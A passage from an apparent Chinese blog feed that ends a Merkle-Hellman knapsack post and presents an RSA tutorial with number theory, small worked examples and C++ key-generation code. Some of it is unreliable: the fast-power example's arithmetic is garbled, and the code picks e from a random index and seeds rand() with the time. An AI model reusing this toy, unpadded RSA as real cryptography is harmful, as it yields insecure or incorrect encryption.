secret_text;</span><br><span class="line">        <span class="built_in">encode</span>(secret_text);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加密</span></span><br><span class="line">请输入<span class="number">1</span>选择加密，或者输入<span class="number">2</span>选择解密</span><br><span class="line"><span class="number">1</span></span><br><span class="line">请设置超递增序列长度</span><br><span class="line"><span class="number">8</span></span><br><span class="line">请输入明文</span><br><span class="line"><span class="number">10101100</span></span><br><span class="line">加密后得密文:<span class="number">710</span></span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line">请输入<span class="number">1</span>选择加密，或者输入<span class="number">2</span>选择解密</span><br><span class="line"><span class="number">2</span></span><br><span class="line">请设置超递增序列长度</span><br><span class="line"><span class="number">8</span></span><br><span class="line">请输入密文</span><br><span class="line"><span class="number">710</span></span><br><span class="line">解密后的明文:<span class="number">10101100</span></span><br></pre></td></tr></table></figure><h2 id="6-总结">6.总结</h2><p>背包问题是 NP 完全类问题，至今还没有多项式时间的求解方法。若对所有可能解进行穷举搜索，当 n&gt;100 时,计算是不可能的。然而对大多数基于背包问题的公钥加密体制,已经有有效的攻击方法。1983 年 Shamir 发现了 MH 加密体制的缺陷,即可以从普通的背包向量(公)重构出超递增背包向量(私),从而证明 MH 背包密码是不安全的。自从 MH 被破后，又有许多其他的背包加密体制被提出,但这些体制中的大多数都被用同样的密码分析方法攻破了，少数则采用更高级的分析方法攻破,虽然有极个别的背包变型还没有破解,但人们已不再信赖它们了。另外，大多数背包密码算法不适合数字签名。</p>]]></content>
    
    
    <summary type="html">MH背包公钥加解密原理及C++代码</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="MH背包公钥算法" scheme="https://nonevector.top/tags/MH%E8%83%8C%E5%8C%85%E5%85%AC%E9%92%A5%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>公钥密码体制之RSA公钥加密体制</title>
    <link href="https://nonevector.top/posts/9.html"/>
    <id>https://nonevector.top/posts/9.html</id>
    <published>2023-11-05T01:04:40.170Z</published>
    <updated>2023-12-07T00:41:32.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RSA-公钥机密体制">RSA 公钥机密体制</h2><p>在 Diffie 和 Hellman 提出公钥密码体制的设想后,Merkle 和 Hellman 首先共同提出 MH 背包公钥加密体制，随后 Rivest,Shamir ,Adleman 联合提出<code>RSA公加密体制</code>。<code>RSA</code>虽晚于<code>MH背包公钥加密体制</code>,但它是第一个安全、实用的公钥加密算法,已经成为国际标准,是目前应用广泛的公钥加密体制。<code>RSA</code>的基础是<strong>数论的欧拉定理</strong>,它的安全性依赖于<strong>大整数因子分解的困难性</strong>。因为加解密次序可换,<code>RSA 公钥加密体制</code>既可用于加密,也可用于<strong>设计数字签名体制</strong>，加密体制又可以分为密钥生成算法、加密算法和解密算法三部分。</p><h2 id="数论基础">数论基础</h2><ol><li><p>欧拉函数：$1 \sim N$中与 N 互质的数的<strong>个数</strong>成为欧拉函数，记为$\varphi(N)$，若在算数基本定理中,$N = p_1^{a_1}p_2^{a_2} \ldots p_m^{a_m}$,则：</p><p>$$\varphi(N) = N \times \frac{p_1 - 1}{p_1} \times \frac{p_2 - 1}{p_2} \times \ldots \times \frac{p_m - 1}{p_m}$$</p></li><li><p>欧拉定理：$a^{\varphi(n)} \equiv 1(modn)$,其中 a 和 n 都是正整数，且 a 和 n 互质</p><blockquote><p>小费马定理：假设 p 是一个质数，且 a 和 p 互质（即两者只有一个公约数 1），那么$a^{p-1} \equiv 1(mod p)$恒成立。</p></blockquote></li><li><p>同余的一些基本性质：</p><p>(a + b) % p = (a % p + b % p) % p<br>(a - b) % p = (a % p - b % p) % p<br>(a _ b) % p = (a % p _ b % p) % p<br>但对于除法却不成立，即(a / b) % p 不等于 (a % p / b % p) % p ,但如果利用乘法逆元便可以</p><p>如需证明，<a href="https://www.nonevector.top/posts/1.html">点击直达（￣︶￣）↗ 　</a></p></li><li><p><strong>贝祖定理</strong>(<strong>裴蜀等式</strong>)：</p><p>​ 即如果 a、b 是整数，那么一定存在整数 x、y 使得 ax+by=gcd(a,b)。</p></li><li><p>扩展欧几里得算法：可以快速求出 ax+by=gcd(a,b)中的 x 和 y 的值（可以用于下面求逆元）</p></li><li><p><strong>逆元(很重要！！！！)</strong>：$ab \equiv 1(mod p)$,那么 a，b 互为模 n 意义下的逆元</p></li><li><p>快速幂（用于解决 mod 时溢出的问题，速度也大大加快 ψ(｀ ∇´)ψ</p><blockquote><p>所有 a^b 的 b 都能转换为二进制</p><p>即如果 b 的二进制表示的第 0 位为 1,则乘上当前的 a</p><p>b 右移一位</p><p>更新 a,a 依次为 a^{2^0},a^{2^1},a^{2^2},…,a^{2^logb}</p><p>因此举个例子</p><p>$$<br>4^5mod10 = 4^{(101)_2} mod 10 = 4 ^{2^0 + 2^2} mod 10 = (4 mod 10 + 96mod10)mod10=(24) mod 10 = 4<br>$$</p><p>在次方的同时进行 mod 运算，中间数不会太大</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LL <span class="title">qmi</span><span class="params">(LL a, LL k, LL p)</span> <span class="comment">//快速幂求余数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(k &amp; <span class="number">1</span>) res = (LL)res * a % p;</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="1-RSA-密钥生成算法">1. RSA 密钥生成算法</h2><p>密钥生成算法为用户生成加解密算法中使用的公私密钥对,分为以下几个步骤:</p><ol><li><p>选取两个安全大素数<code>p</code>和<code>q</code>(“大”指其长度要足够长目前推荐长度为至少 1024 比<br>特);</p></li><li><p>计算乘积$ n=p \times q,\varphi(n)=(p-1)(q-1)$,其中 $\varphi(n)$为<code>n</code>的欧拉函数;</p><blockquote><p>公式由来：因为 n 包含两个质因子 p，q，所以在 1 到 n-1 中包含 p，q 因子的数均与 n 不互素。包含 p 因子的有 p，2p，3p 一直到 p（q-1）即（q-1)个，同理含 q 的有（p-1)个。一共 p+q-2 个数与 n 不互素</p><p>则在这 n-1 个数中与 n 互素的数一共有 n-1-（p+q-2）=n-p-q+1，且 n 可以写作 p*q，可以得到（p-1)(q-1)</p></blockquote></li><li><p>随机选取整数$ e(1&lt;e&lt; \varphi (n))$作为公钥,要求满足 $gcd(e,\varphi(n))=1$,即$e与\varphi(n)$互素;</p></li><li><p>用<code>Euclid </code>扩展算法(欧几里得扩展算法）计算私钥<code>d</code>,以满足$d \times e\equiv1(mod\varphi(n))$,即$d\equiv e^{-1}(mod \varphi(n))$则<code>e</code>和<code>n </code>是公钥,<code>d </code>是私钥。</p><blockquote><p>给定 n 和正整数$a_i,b_i$，利用欧几里得扩展算法可快速求出$x_i,y_i$满足$a_i \times x_i + b_i \times y_i = gcd(a_i, b_i)$.</p><p><a href="https://www.acwing.com/solution/content/1393/">直达欧几里得扩展算法题解及 c++代码</a></p><p>因为$d \times e\equiv1(mod\varphi(n))$，所以$(e)d + (-k) \varphi(n)) = 1$,d 与-k 分别为欲求的 x，y，可直接用欧几里得扩展算法直接求 ，下面样例给出 c++代码</p></blockquote></li></ol><p>注意,加解密算法中两个素数<code>p</code>和<code>q</code>不再需要,可销毁,但绝不能泄露。</p><h3 id="样例">样例</h3><p>下面举例说明 RSA 公钥/私钥对的具体产生过程(注,在公钥密码体制中,参数长度都比较长,而为方便计算,实例中选取参数都较小,重在说明算法流程)。</p><p>假设 p=13,q=17;</p><p>计算 $n=p\times q=13\times17=221$;则$\varphi(n)=(p-1)\times(q-1)=(13-1)\times(17-1)=192$。选取公钥 e=11(一般为素数),满足$1&lt;e&lt;\varphi(n)$,且满足 $gcd(e,\varphi(n))=1$。通过 Euclid 扩展算法求得满足公式 $d\times e\equiv1(mod 192)$的 d=35。所以,得到公钥(e,n)为(11,221),私钥 d 为 35。</p><h3 id="C-代码">C++代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span> <span class="comment">//用它来获取当前时间，作为随机数生成器的种子。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span> <span class="comment">//rand()和srand()，这两个函数用于生成随机数。</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> x first</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> y second</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;LL, LL&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> LL N = <span class="number">110</span>;</span><br><span class="line"></span><br><span class="line">PII public_key;</span><br><span class="line">LL private_key;</span><br><span class="line">LL p, q;</span><br><span class="line">LL Euler;<span class="comment">// 欧拉函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取1-110的质数</span></span><br><span class="line">LL primes[N];</span><br><span class="line">LL cnt;</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">()</span></span>&#123; <span class="comment">// 质数筛算法获取质数（速度比较快）</span></span><br><span class="line">    <span class="keyword">for</span>(LL i=<span class="number">2</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!st[i]) primes[cnt++]=i;</span><br><span class="line">        <span class="keyword">for</span>(LL j=<span class="number">0</span>;primes[j]&lt;=N/i;j++)&#123;</span><br><span class="line">            st[primes[j]*i]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(i%primes[j]==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">gcd</span><span class="params">(LL a, LL b)</span> <span class="comment">// 欧几里得算法判断最小公共因子</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b?<span class="built_in">gcd</span>(b, a % b):a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LL <span class="title">exgcd</span><span class="params">(LL a, LL b, LL &amp;x, LL &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!b)</span><br><span class="line">    &#123;</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LL d, x1, y1;</span><br><span class="line">    d = <span class="built_in">exgcd</span>(b, a % b, x1, y1);</span><br><span class="line">    x = y1, y = x1 - a / b * y1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_Rand</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">rand</span>() % (max - min)) + min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//e*d + Euler*k = 1 类比 a*x + b*y=1</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_public_private_key</span><span class="params">(LL p, LL q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL k, d;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">    LL n = p * q;</span><br><span class="line">    Euler = (p - <span class="number">1</span>) * (q - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt;cnt &lt;&lt;endl;</span><br><span class="line">    <span class="type">int</span> e = <span class="built_in">get_Rand</span>(<span class="number">0</span>, cnt - <span class="number">1</span>);</span><br><span class="line">    cout &lt;&lt; e &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">while</span>(e &gt;= Euler || <span class="built_in">gcd</span>(e, Euler) != <span class="number">1</span>)<span class="comment">// 随机选择公钥,不满足条件继续随机</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = <span class="built_in">get_Rand</span>(<span class="number">0</span>, cnt - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exgcd</span>(e, Euler, d, k);</span><br><span class="line">    public_key.x = e, public_key.y = n;</span><br><span class="line">    private_key = d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入素数p和q&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; p &gt;&gt; q;</span><br><span class="line">    <span class="built_in">get_primes</span>();</span><br><span class="line">    <span class="built_in">get_public_private_key</span>(p, q);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;公钥为：(&quot;</span> &lt;&lt; public_key.x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; public_key.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl &lt;&lt;</span><br><span class="line">    <span class="string">&quot;私钥为：(&quot;</span> &lt;&lt; private_key &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为了方便说明这里结果为上面例子一致，但实际上因为公钥e是随机生成的</span></span><br><span class="line"><span class="comment">//因此只要满足条件，每次结果应该都不一样</span></span><br><span class="line">请输入素数p和q</span><br><span class="line"><span class="number">13</span> <span class="number">17</span></span><br><span class="line">公钥为：(<span class="number">11</span>,<span class="number">221</span>)</span><br><span class="line">私钥为：(<span class="number">35</span>)</span><br></pre></td></tr></table></figure><h2 id="2-RSA-加解密算法">2.RSA 加解密算法</h2><h3 id="1-加密过程">1.加密过程</h3><p>加密时首先将明文比特串分组,使得每个分组对应的十进制数小于 <code>n</code>,即分组长度小于$log_2^n$，然后对每个明文分组 $m_i$;作加密运算，具体过程分为如下几步:<br>(1)获得接收方公钥(e,n);<br>(2)把消息 M 分组为长度为$L(L&lt;log_2^n)$的消息分组 $M=m_1m_2···m_t$;<br>(3)使用加密算法 $c_i\equiv m_i^e(mod n)(1 \leq i \leq t)$计算出密文$ C=c_1c_2···c_t$;<br>(4)将密文 C 发送给接收方。</p><h3 id="2-解密过程">2.解密过程</h3><p>(1)接收方收到密文 $ C=c_1c_2···c_t$;<br>(2)使用私钥d 逐一恢复明文分组 $m_i$,$m\equiv c_i^d(mod n)(1 \leq i \leq t)$;<br>(3)得明文消息$M=m_1m_2···m_t$;</p><h3 id="3-正确性">3.正确性</h3><blockquote><p>说实话我是看的头晕 😵</p></blockquote><p>下面证明若算法严格按步骤执行,接收者可以使用私钥及解密算法恢复出明文。</p><p>由公式$c_i\equiv m_i^e(mod n)$,可得</p><p>$c_i^d(mod n)=m_i^{ed}(mod n)\equiv m_i^{\varphi(n) + 1}(mod n)$因为$ed\equiv 1 (mod \varphi(n))$,故存在 $k \in Z$,使得$ed=k\times \varphi(n)+1$,下面分两种情况讨论:</p><ol><li><p>$gcd(m_i,n)=1$,则由欧拉定理得</p><p>$$<br>m_i^{\varphi(n)}\equiv 1 (mod n) \Rightarrow m_i^{\varphi(n)}\equiv 1(mod n),m_i^{\varphi(n) + 1}\equiv m_i(mod n)<br>$$</p><p>又因为$m_i &lt; n,所以,c_i^dmodn\equiv m_i^{k\varphi(n) + 1} \equiv m_i(modn)$。</p></li><li><p>$gcd(m_i,n)\neq 1$,可得 $gcd(m_i,n)&gt;1$。由于$n=p\times q$,所以$gcd(m_i,n)$必含 p 或 q。</p><p>不妨设$ gcd(n,m_i)=p$,则有 $m_i=tp,1\leq t &lt; q$,由欧拉定理得</p><p>$$<br>m_i^{\varphi(q)} \equiv 1(mod q)<br>$$</p><p>因此，</p><p>$$<br>m_i^{\varphi(q)}\equiv 1 (mod q) \Rightarrow [m_i^{\varphi(q)}]^{\varphi( p)}\equiv 1(mod q) \Rightarrow m_i^{\varphi(n)}\equiv 1(mod q)<br>$$</p><p>因此存在一整数 r,使得 $m_i^{\varphi(n)} = 1十rq$,两边同时乘以$m_i=tp$得:<br>左边$=m_i^{\varphi(n) + 1}$;右边$=tp+rq·tp=m_i+rtpq-m_i十rtn$。<br>上面等式两边同时进行模 n 运算,得 $m_i^{\varphi(n)+1}=(m_i+rtn)\equiv m_i(mod n)$。<br>又因为$m_i &lt;  n$,得$m_i^{\varphi(n) + 1}mod n=m_i$。<br>故由(1)、(2)验证了解密算法的正确性。</p><p>下表是总结</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/05/169037_bf36e7397b-1.png" alt="1.png"></p></li></ol><h3 id="4-实例">4.实例</h3><p>下面举一个简单的例子来说明如何用 RSA 公钥加密体制来对一段消息进行加解密<br>设接收方 B 选择 p=43,q=59,e=13。发送方 A 有消息 m=cybergreatwall,我英文字母表顺序 a=00,01,···25 进行编码。A 欲用 RSA 公钥加密体制加密后传送给 B,求 B 的私钥并描述加解密过程。<br>解 密钥生成:$n=p×g=43×59=2537,\varphi(2537)=42\times 58=2436$</p><p>e=13,则根据 $d\equiv e^{-1}(mod 2436)$,得:d=937</p><p>则公钥(n=2 537,e=13 ),私钥 d=937。<br>A 的加密过程:先将消息分块为:cy、be、rg、re、at、wa、ll。(m1-m6)</p><p>利用英文字母表的顺序编码将明文数字化得:<br>0224 0104 1706 1704 0019 2200 1111<br>利用公钥(n=2537,e=13)和加密算法 $c_i \equiv m^e_i(mod n)$进行加密<br>对第一个分组 m 的加密过程为:</p><p>$$<br>0224^{13}mod2537=1692=c_1<br>$$</p><p>同理对其他分组进行加密,得密文:C=C1C2C3C4C5C6=1692 0803 1093 1943 2299 1254 0724</p><p>解密过程:解密消息时用私钥 d=937 和解密算法 $m_i\equiv c_i^d(mod n)$进行解密对第一组密文 C1 进行解密的过程为:</p><p>$$<br>1692^{937}mod 2537=0224<br>$$</p><p>0224 对应的明文分组为 $m_1=cy$,所以密文 C1 所对应的明文为 cy。</p><p>消息的其余部分用同样的方法就可以恢复出来,得明文 mcyber greatwall。</p><h3 id="5-RSA-的快速计算">5.RSA 的快速计算</h3><p>应用 RSA 算法进行加解密计算的时候,可以使用下列方法加快计算速度</p><ol><li><p>利用模运算的性质:每次乘积后即进行模运算,可以使得中间结果长度小于 n 的长度</p><p>$$<br>[(amod n)\times (bmod n)]mod n=(ab)mod n<br>$$</p><p>每次乘积后即进行模运算,可以使得中间结果长度小于 n 的长度。</p></li><li><p>使用快速取模指数算法可以很有效地减少模乘的次数,对此算法描述如下</p><p>e 的二进制表示为$b_kb_{k-1}···b_0$,其中 $b_i \in {0,1}(i=0,1,···,k)$,则</p><p>$$<br>e = \sum_{i = 0}^{k}{b_{i}2^i} = \sum_{b_i = 1}{2^i}<br>$$</p><p>因此有</p><p>$$<br>m^emod n = m^{\sum_{b_i = 1}{2^i}} mod n =<br>$$</p><p>$$<br>(( \ldots((m^{b_k})^2modn · m^{b_{k - 1}})^2mod n \ldots)^2mod n · m^{b_0}) mod n<br>$$</p><p>这就是快速取模指数算法，计算$c \equiv m^e(mod n) $的快速取模指数算法的伪代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">t &lt;- <span class="number">0</span>; c &lt;- <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i &lt;- k down to <span class="number">0</span></span><br><span class="line"><span class="keyword">do</span>t &lt;- <span class="number">2</span> × t</span><br><span class="line">    c &lt;- (c × c) mod n</span><br><span class="line">    <span class="keyword">if</span> bi = <span class="number">1</span> then t &lt;- t + <span class="number">1</span></span><br><span class="line">                   c &lt;- (c × m) mod n</span><br><span class="line"><span class="keyword">return</span> c</span><br></pre></td></tr></table></figure></li></ol><h3 id="6-C-代码">6.C++代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> x first</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> y second</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line">string alphabet[<span class="number">26</span>] = &#123;</span><br><span class="line"><span class="string">&quot;00&quot;</span>, <span class="string">&quot;01&quot;</span>, <span class="string">&quot;02&quot;</span>, <span class="string">&quot;03&quot;</span>, <span class="string">&quot;04&quot;</span>, <span class="string">&quot;05&quot;</span>,</span><br><span class="line"><span class="string">&quot;06&quot;</span>, <span class="string">&quot;07&quot;</span>, <span class="string">&quot;08&quot;</span>, <span class="string">&quot;09&quot;</span>, <span class="string">&quot;10&quot;</span>,</span><br><span class="line"><span class="string">&quot;11&quot;</span>, <span class="string">&quot;12&quot;</span>, <span class="string">&quot;13&quot;</span>, <span class="string">&quot;14&quot;</span>, <span 